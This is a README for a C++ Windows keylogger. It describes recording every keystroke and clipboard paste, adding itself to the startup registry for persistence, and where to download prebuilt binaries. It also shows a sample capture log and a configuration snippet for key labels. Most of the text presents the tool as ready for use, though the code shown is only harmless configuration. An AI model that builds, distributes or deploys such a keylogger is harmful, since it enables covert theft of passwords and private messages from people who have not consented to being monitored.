## About
A simple yet powerful C++ Windows keylogger.

- Automically added to startup registry
- Keyboard locale support
- Special characters and numeric keypad
- Clipboard parsing on `Ctrl + V`

## Log example
```
testing 123 123[CTRL + A][BACKSPACE]

[CTRL + C]This was copy pasted.This was copy pasted.This was copy pasted.

1234567890
!@#$%^&*()

é â ê î ô û ë ï ü
```
## Builds
This project has prebuilt binaries available here: https://github.com/vim2meta/Keylogger/releases.

## Configuration
You may configure the name of the logging file aswell as what should be logged for each [virtual-key code](https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx) by changing the `configuration.h` file.
```cpp
constexpr const wchar_t* out_file = L"different_name.txt";

const std::unordered_map<DWORD, std::wstring> key_codes
    {
        { VK_UP, L"[UP ARROW]" },
        { VK_DOWN, L"[DOWN ARROW]" },
        { VK_RETURN, L"\n" },
        { VK_ESCAPE, L"[ESCAPE]" },
        { VK_BACK, L"[BACKSPACE]" }
    };
```

## Compiling
Visual Studio 2017 is required to load the solution. However, the project may be compiled by any C++ 11 compiler. The required Windows libraries are `User32.lib` and `Advapi32.lib`.